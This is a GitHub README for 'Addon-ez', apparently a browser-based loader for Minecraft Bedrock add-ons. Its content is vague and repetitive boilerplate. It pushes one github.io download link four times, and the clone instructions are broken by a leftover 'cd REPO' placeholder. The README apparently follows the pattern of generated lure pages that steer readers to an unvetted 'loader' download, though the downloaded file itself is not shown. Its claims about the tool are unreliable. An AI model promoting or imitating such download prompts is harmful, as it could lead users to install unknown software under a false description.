# Addon-ez v2026 - Loader and Update Utility 2026

> **A browser-based tool for discovering, preparing, and installing Minecraft Bedrock add-ons through an uncomplicated web workflow.**

[![Loader](https://img.shields.io/badge/Type-Loader-blue?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Web-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/noah-scottqkh6962/addon-ez-bedrock-loader?style=flat-square)](https://github.com/noah-scottqkh6962/addon-ez-bedrock-loader)

---

<p align="center">
  <a href="https://noah-scottqkh6962.github.io/addon-ez-bedrock-loader/">
    <img src="https://img.shields.io/badge/Download-Addon--ez%20Loader-brightgreen?style=for-the-badge" alt="Download Addon-ez Loader">
  </a>
</p>

> **[Download Addon-ez Loader](https://noah-scottqkh6962.github.io/addon-ez-bedrock-loader/)**

---

[Download Latest Build](https://noah-scottqkh6962.github.io/addon-ez-bedrock-loader/)

---

## Overview

Addon-ez brings Minecraft Bedrock add-on browsing and installation preparation into the browser. From its web interface, users can locate available add-on content, prepare a selection, and begin the installation process without using a traditional desktop installer.

The project consists of a static website that can be published online or delivered through a local web server. Its browser-first design keeps add-on preparation and installation steps together in one accessible workflow.

---

## Included Capabilities

- Explore Minecraft Bedrock add-on content in a web interface.
- Prepare chosen add-ons before launching installation.
- Access the utility from a hosted site or a locally served copy.
- Run in static hosting environments without a separate application backend.
- Work through installation using a guided browser flow.
- Maintain the website through manual content updates.
- Launch the installer from the published web build.
- Provide a focused browser utility for managing add-on content.

---

## Getting Started

### Use the Online Version

1. Visit the [latest Addon-ez build](https://noah-scottqkh6962.github.io/addon-ez-bedrock-loader/).
2. Look through the available Minecraft Bedrock add-ons.
3. Choose the content you want to prepare.
4. Complete the instructions shown on the page.
5. When prompted, finish the import or installation steps in Minecraft Bedrock.

### Serve the Project Locally

Clone the repository, then use a local web server to serve its static files:

```bash
git clone https://github.com/noah-scottqkh6962/addon-ez-bedrock-loader.git
cd REPO
```

Open the project through the static server of your choice and navigate to the local URL it supplies. HTTP serving is recommended because it provides more consistent browser behavior than opening files directly.

### Deploy Your Own Copy

The project can be published through a static hosting service as well. Upload the repository files, deploy the site, and open the generated web address in a compatible browser.

---

## Available Update Paths

| Channel | Availability | Intended Use |
|---|---|---|
| Latest | Published web build | General use from the current hosted release |
| Manual | Repository or locally served files | Testing or deploying manually updated site content |

Addon-ez relies on manually updated site content. To use a newer release, open the current hosted build or update a local deployment with the latest files from the repository.

---

## Troubleshooting Guide

### The website will not open

Check the hosted URL for accuracy, or make sure the local static server is running. Loading project files directly from the filesystem can behave differently from accessing the same files over HTTP.

### The installation process does not begin

Recheck the instructions displayed by the site and ensure the selected add-on has finished preparation. Browser dialogs and Minecraft Bedrock import actions may need to be approved before installation can continue.

### My local copy still displays old content

Update the local files to the newest version and reload the site. Since browsers can cache static assets, perform a refresh after replacing the deployment.

### The hosted site differs from the repository

The published build may contain a separately deployed manual content update. Compare the online version with the repository, then publish the intended files again if required.

### Browser behavior varies

Use a current browser and open Addon-ez through its hosted URL or a local web server. Also review browser prompts and permissions associated with opening or transferring add-on files.

---

## Frequently Asked Questions

### Does Addon-ez install Minecraft Bedrock?

No. Addon-ez handles browsing, preparation, and the start of installation for Minecraft Bedrock add-ons; it does not install Minecraft Bedrock itself.

### Is a desktop loader necessary?

No. The web workflow does not require a dedicated desktop loader and is intended to run in a browser from either a hosted site or a locally served copy.

### Can the project work with local files?

Yes. The repository can be served as a local static website. Which add-ons are available and how they can be prepared depends on the content included in the deployed site.

### How does Addon-ez receive updates?

Site content is updated manually. Use the published build to access the current hosted version, or refresh a local deployment with updated repository files.

### Can an earlier version be restored?

Yes, provided you have a previous copy of the static files. Replace the deployed files with that earlier version and reload the website.

### Where can I find logs?

Addon-ez is a static browser utility and does not define a separate application logging service. Browser-side information can be reviewed through the browser's developer tools and console.

### Does Minecraft Bedrock work on all devices with this utility?

Addon-ez is intended for Minecraft Bedrock add-on workflows through the web. Installation results depend on the browser, device, operating system, and Minecraft Bedrock environment in use.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
